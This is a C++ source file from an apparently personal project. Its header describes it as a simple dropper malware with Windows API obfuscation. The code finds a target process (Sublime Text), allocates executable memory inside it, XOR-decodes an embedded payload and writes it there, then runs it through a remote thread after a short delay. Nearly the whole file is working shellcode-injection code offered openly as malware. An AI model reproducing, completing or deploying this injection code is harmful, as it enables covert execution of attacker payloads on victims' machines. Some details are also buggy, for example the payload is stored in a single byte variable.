/*
	Author:		lemur
	Email:		1emvr@protonmail.com
	GitHub:		https://github.com/1emvr/
	Date:		01.12.2023		05:08 AM

	Simple dropper malware with WINAPI call obfuscation.
	
	Prototype definitions: 
	https://learn.microsoft.com/en-us/windows/win32/api

*/
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <memoryapi.h>

#include <cstdint>
#include <string>
#include <iostream>

#include "resource.h"
using namespace std;

typedef LPVOID(WINAPI* VirtualAllocEx_t)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
);
typedef BOOL(WINAPI* WriteProcessMemory_t)(
	HANDLE hProcess,
	LPVOID lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T nSize,
	SIZE_T* lpNumberOfBytesWritten
);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(
	HANDLE hProcess,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
);

DWORD GetProcessId(wstring processName) {
	
	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(void) {

	Sleep(5000);

	wstring processName = L"sublime_text.exe";

	DWORD pid = GetProcessId(processName);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	HMODULE hFunctionCall = LoadLibrary((LPCWSTR)sKernel32);
	
	//VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(hFunctionCall, (LPCSTR)sVirtualAllocEx);
	PVOID hRemoteShellcode = VirtualAllocEx(hProcess, NULL, payloadLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	UCHAR hPayload = XorCipher(payload, payloadLen, key, keylen);
	//WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(hFunctionCall, (LPCSTR)sWriteProcessMemory);
	WriteProcessMemory(hProcess, hRemoteShellcode, (LPCVOID)hPayload, payloadLen, NULL); // thrown
	
	//CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(hFunctionCall, (LPCSTR)sCreateRemoteThread);
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hRemoteShellcode, NULL, 0, NULL);

	CloseHandle(hProcess);
	return 0;
}